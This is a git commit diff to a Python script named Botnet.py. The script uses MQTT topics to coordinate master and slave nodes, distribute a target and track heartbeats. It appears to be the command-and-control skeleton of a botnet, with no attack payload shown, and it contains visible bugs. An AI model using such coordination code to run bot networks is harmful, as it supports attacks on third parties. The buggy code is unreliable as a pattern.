3b395fd928917fa9b60dcc18d430e8d5c7e4e104
? <alberto.garcia.2016@upb.edu.co>
2019-05-12 19:44:42 -0500

    Update Botnet.py

--- MqttPython/Mqtt/PublisherSubscriber/Botnet.py
+++ MqttPython/Mqtt/PublisherSubscriber/Botnet.py
@@ -7,6 +7,23 @@ target=0
 received=-1
 lastId=-555
 nodeId=-1
+def on_connectm(client, userdata, flags, rc):
+    print("Connected with result code "+str(rc))
+    client.subscribe("botnet/target")
+    client.subscribe("botnet/lastId")
+    client.unsuscribe("botnet/heartbeat")
+def on_messagem(client, userdata, msg):
+    global received
+    global lastId
+    print(msg.topic+" "+str(msg.payload))
+    print(" ")
+    received=1
+    if(msg.topic=="botnet/lastId" and lastId!=int(msg.payload)):
+        lastId=int(msg.payload)
+        print("New local last id:",lastId)
+    if(msg.topic=="botnet/target"):
+        target=str(msg.payload)
+        print("New local target:",target)
 def on_connectsc(client, userdata, flags, rc):
         print("Connected with result code "+str(rc))
         client.subscribe("botnet/heartbeat")
@@ -17,15 +34,10 @@ def on_messagesc(client, userdata, msg):
         global target
         received=1
         inp=str(msg.payload)[2:-1].split(" ")
-        #print("Message",inp)
-        topic=msg.topic
-        print(topic+" "+inp)
+        print("Target/Id",inp[0],inp[1])
+        topic=str(msg.topic)
         print(" ")
-        
-        print(topic,"topico")
-        print("laz",lastId,"int(inp[1])",int(inp[1]))
         if(topic=="botnet/heartbeat" and lastId!=int(inp[1])):
-            print("lasaidi",inp[1])
             lastId=int(inp[1])
             print("New local last id:",lastId)
         if(msg.topic=="botnet/heartbeat" and inp[0]!="0"): ##Regex for catching ip
@@ -60,13 +72,14 @@ def on_publish(client,userdata,result):
 def slave():
     global client
     global nodeId
+    print("I'm slave")
     client.on_connect = on_connectsc
     client.on_message = on_messagesc
     client.on_publish = on_publish
     client.connect(broker,port)
     startTime=time.time()
     time.sleep(1)
-    while(nodeId==0):
+    while(nodeId==1):
         client.loop(.1)
         if(int((time.time()-startTime)%60%2)==0):
             startTime=time.time()
@@ -76,27 +89,11 @@ def master():
     global client
     global nodeId
     global lastId
-    def on_connect(client, userdata, flags, rc):
-        print("Connected with result code "+str(rc))
-        client.subscribe("botnet/target")
-        client.subscribe("botnet/lastId")
-        client.unsuscribe("botnet/heartbeat")
-    def on_message(client, userdata, msg):
-        global received
-        global lastId
-        print(msg.topic+" "+str(msg.payload))
-        print(" ")
-        received=1
-        if(msg.topic=="botnet/lastId" and lastId!=int(msg.payload)):
-            lastId=int(msg.payload)
-            print("New local last id:",lastId)
-        if(msg.topic=="botnet/target"):
-            target=str(msg.payload)
-            print("New local target:",target)
 
 
-    client.on_connect = on_connect
-    client.on_message = on_message
+
+    client.on_connect = on_connectm
+    client.on_message = on_messagem
     client.on_publish = on_publish
     client.connect(broker,port)
     
@@ -152,9 +149,10 @@ def common():
                 break
             else:
                 received=0
+            if(isSlave()):
+                slave()
     
-    if(isSlave() and not isReceived()):
-        master()
+
 
 
 client = mqtt.Client()
